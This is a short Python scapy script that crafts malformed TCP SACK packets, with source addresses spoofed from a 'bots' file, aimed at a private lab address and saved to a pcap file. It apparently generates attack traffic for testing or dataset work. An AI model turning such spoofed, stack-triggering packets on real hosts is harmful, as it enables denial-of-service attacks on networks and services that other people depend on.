from scapy.all import *
import random, time, ipaddress

# TCP SACK (Malformed)
TARGET_IP   = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE     = "../bots.txt"
IFACE       = "enp0s3"
PKTS_TOTAL  = 100

def load_bots(file):
    bots = []
    with open(file) as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bots.append(ip)
    return bots

def run_sack_malformed():
    bots  = load_bots(BOTFILE)
    pkts  = []

    for _ in range(PKTS_TOTAL):
        src_ip = random.choice(bots)

        ip  = IP(src=src_ip, dst=TARGET_IP)

        tcp = TCP(
            sport=RandShort(), dport=TARGET_PORT,
            flags='A', seq=random.randint(0, 4294967295),
            window=8192,
            options=[(5, b'')]          # <<--- TRIGGER
        )

        pkts.append(Ether() / ip / tcp)

    start_time = time.perf_counter()
    wrpcap("tcp_sack.pcap", pkts)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nPCAP file saved.")
    print(f"Total time to save packets: {duration:.4f} seconds")

if __name__ == "__main__":
    run_sack_malformed()

# sudo PYTHONPATH=$HOME/scapy python3 tcp_sack.py